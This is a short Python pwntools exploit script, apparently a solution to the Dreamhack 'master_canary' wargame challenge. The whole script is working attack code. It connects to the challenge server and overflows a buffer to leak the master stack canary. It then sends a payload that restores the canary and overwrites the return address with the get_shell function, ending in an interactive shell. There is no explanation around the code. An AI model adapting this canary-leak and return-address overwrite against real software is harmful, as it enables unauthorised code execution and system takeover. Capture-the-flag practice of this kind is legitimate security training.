#!/usr/bin/env python3

from pwn import *
import time
context.log_level = "debug"

e = ELF("./master_canary")
HOST = "host1.dreamhack.games"
PORT = 11525
conn = remote(HOST, PORT)

conn.sendlineafter("> ", "1")
conn.sendlineafter("> ", "2")
conn.sendlineafter("Size: ", str(int(0x8e9)))
conn.sendlineafter("Data: ", b"\x90"*0x8e9)
stack_guard = b"\x00"+conn.recv()[-15:-8]
conn.sendline(b"3\n"+(b"\x90"*0x28)+stack_guard+b"\x90"*8+p64(e.symbols["get_shell"]))
conn.recv()
conn.interactive()
